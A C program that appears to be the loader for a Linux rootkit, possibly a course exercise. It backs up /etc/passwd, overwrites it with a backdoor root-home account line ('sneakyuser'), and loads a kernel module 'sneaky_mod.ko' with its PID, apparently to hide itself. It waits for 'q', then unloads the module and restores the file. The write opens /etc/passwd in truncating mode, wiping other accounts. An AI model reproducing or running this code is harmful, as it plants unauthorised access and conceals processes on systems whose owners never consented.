#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

int add_to_pw(const char *fileName, const char *line){
    FILE *file = fopen(fileName, "w");
    if(!file){
        printf("Fail to open file for writing in pw\n");
        return -1;
    }
    fprintf(file,"%s",line);
    fclose(file);
    return 0;
}

int copy_file(const char *origin_file, const char *dest_file){
    FILE *origin = fopen(origin_file,"r");
    FILE *dest = fopen(dest_file,"w");
    if(!origin){
        printf("Fail to open the origin file\n");
        return -1;
    }
    if(!dest){
        printf("Fail to open file at destination location\n");
        return -1;
    }
    char c = fgetc(origin);
    while( c !=EOF){
        fputc(c, dest);
        c = fgetc(origin);
    }
    fclose(origin);
    fclose(dest);
}

int main(){
    printf("sneaky_process pid = %d\n", getpid());
    if(copy_file("/etc/passwd","/tmp/passwd")==-1){
        return EXIT_FAILURE;
    }
    if(add_to_pw("/etc/passwd","sneakyuser:abc123:2000:2000:sneakyuser:/root:bash")==-1){
        return EXIT_FAILURE;
    }

    char command[100];
    sprintf(command, "insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
    system(command);

    char input;
    input = getchar();
    while(input!='q'){
        input = getchar();
    }

    system("rmmod sneaky_mod.ko");
    
    if(copy_file("/tmp/passwd", "/etc/passwd")==-1){
        return EXIT_FAILURE;
    }
    system("rm /tmp/passwd");
    return EXIT_SUCCESS;
}